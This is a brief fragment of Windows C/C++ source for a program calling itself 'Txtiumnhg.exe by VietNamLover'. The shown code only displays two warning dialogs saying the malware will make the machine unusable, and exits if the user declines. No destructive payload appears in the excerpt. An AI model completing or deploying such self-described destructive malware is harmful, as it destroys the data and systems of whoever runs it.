...
DO YOU WANT TO EXECUTE THIS MALWARE, RESULTING IN AN UNUSABLE MACHINE?", L"Txtiumnhg.exe by VietNamLover", 
...
STILL EXECUTE IT? ", 
                    L"Txtiumnhg.exe by VietNamLover", MB_YESNO | MB_ICONEXCLAMATION) == IDNO) {
        ExitProcess(0);
    }
